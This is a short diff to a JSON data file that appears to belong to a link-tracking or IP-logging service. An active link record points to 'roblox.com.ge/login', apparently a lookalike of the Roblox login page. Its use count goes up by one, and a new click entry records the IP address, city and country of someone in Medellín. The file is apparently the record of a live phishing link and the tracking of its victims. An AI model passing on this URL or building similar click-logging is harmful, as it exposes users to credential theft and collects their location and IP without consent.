@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1058,
+    "useCount": 1059,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8584,6 +8584,14 @@
         "city": "Esmeraldas",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777240351983,
+        "ip": "152.202.37.1",
+        "country": "Colombia",
+        "city": "Medellín",
+        "flag": "🇨🇴",
+        "countryCode": "CO"
       }
     ]
   },
